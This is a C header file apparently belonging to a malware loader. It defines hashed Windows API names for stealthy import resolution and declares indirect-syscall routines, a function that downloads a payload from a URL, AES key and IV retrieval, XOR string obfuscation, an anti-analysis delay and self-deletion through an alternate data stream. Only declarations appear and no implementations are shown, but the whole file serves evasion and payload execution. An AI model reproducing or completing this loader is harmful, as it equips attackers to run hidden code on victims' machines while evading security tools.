#include "typedefs.h"

#define INITIAL_SEED	12

#define InternetOpenW_JOAA      0x277D820D
#define InternetOpenUrlW_JOAA   0xEB873C4A
#define InternetSetOptionW_JOAA         0xE0DDCD74
#define InternetReadFile_JOAA   0x45ACDF8C
#define InternetCloseHandle_JOAA        0x5DE615E4
#define LocalAlloc_JOAA         0x2262314F
#define LocalReAlloc_JOAA       0x508C490E
#define LocalFree_JOAA  0x6BF03E62
#define NtAddBootEntry_JOAA     0x857E3353
#define CreateEventA_JOAA       0x91BAE8A2
#define ZwAllocateVirtualMemory_JOAA    0x6216DAAB
#define NtProtectVirtualMemory_JOAA     0xFA0A9F98
#define TpAllocWait_JOAA        0x42224F6E
#define TpSetWait_JOAA  0xF7690390
#define NtWaitForSingleObject_JOAA      0xDECFB51C
#define LdrLoadDll_JOAA         0xA289D89E
#define CallNextHookEx_JOAA     0x306AA339
#define SetWindowsHookExW_JOAA  0x4598122F
#define DefWindowProcW_JOAA     0x25935F1A
#define GetModuleFileNameW_JOAA         0x788AFDF9
#define CreateFileW_JOAA        0xC3650E27
#define SetFileInformationByHandle_JOAA         0x0EFCCEE9
#define GetTickCount64_JOAA     0x50FFB3C9
#define UnhookWindowsHookEx_JOAA        0x6B2C2289
#define GetMessageW_JOAA        0x56C474F0
#define NtClose_JOAA    0x11D94A87
#define NtDelayExecution_JOAA   0x115481D8
#define NtCreateThreadEx_JOAA   0x0FEE20A7
#define KERNEL32DLL_JOAA        0x0F3BBD1E
#define WININETDLL_JOAA         0x5917DEAF
#define NTDLLDLL_JOAA   0x6AF12C52
#define USER32DLL_JOAA  0xC781D7BA

#define KEY_SIZE			0x20
#define IV_SIZE				0x10

#define MAX_LENGTH 100

#define ANTIANALYSIS
#define NEW_STREAM L":M4rdc0re"

UINT32 HashStringJenkinsOneAtATime32BitA(PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))

BOOL GetSyscallId(PVOID pModuleBase, DWORD* SyscallId, PCHAR fnctolookfor);
extern VOID setup(DWORD id, LPVOID jmptofake);
extern NTSTATUS executioner();
CHAR _toUpper(CHAR C);
PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);
SIZE_T _CharToWchar(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed);
SIZE_T _StrlenA(LPCSTR String);
SIZE_T _StrlenW(LPCWSTR String);

typedef struct _API_HASHING {
	fnInternetOpenW	pInternetOpenW;
	fnInternetOpenUrlW	pInternetOpenUrlW;
	fnLocalAlloc	pLocalAlloc;
	fnInternetReadFile	pInternetReadFile;
	fnLocalReAlloc	pLocalReAlloc;
	fnInternetCloseHandle	pInternetCloseHandle;
	fnInternetSetOptionW	pInternetSetOptionW;
	fnLocalFree	pLocalFree;
	fnCreateEventA	pCreateEventA;
	fnTpAllocWait pTpAllocWait;
	fnTpSetWait	pTpSetWait;
	fnLdrLoadDll	pLdrLoadDll;
	fnCallNextHookEx pCallNextHookEx;
	fnGetTickCount64 pGetTickCount64;
	fnSetWindowsHookExW pSetWindowsHookExW;
	fnGetMessageW pGetMessageW;
	fnDefWindowProcW pDefWindowProcW;
	fnUnhookWindowsHookEx pUnhookWindowsHookEx;
	fnGetModuleFileNameW pGetModuleFileNameW;
	fnCreateFileW pCreateFileW;
	fnSetFileInformationByHandle pSetFileInformationByHandle;
}API_HASHING, * PAPI_HASHING;

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);
BOOL AntiAnalysis(DWORD dwMilliSeconds);
BOOL DeleteSelf();

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(PCHAR dwModuleNameHash);
HMODULE LoadLibraryH(LPSTR DllName);

VOID FetchAesKeyAndIv(PBYTE ctAesKey, PBYTE ctAesIv);
VOID XorByInputKey(const LPCWSTR szString, LPWSTR szResult, const PBYTE bKey, const SIZE_T sKeySize);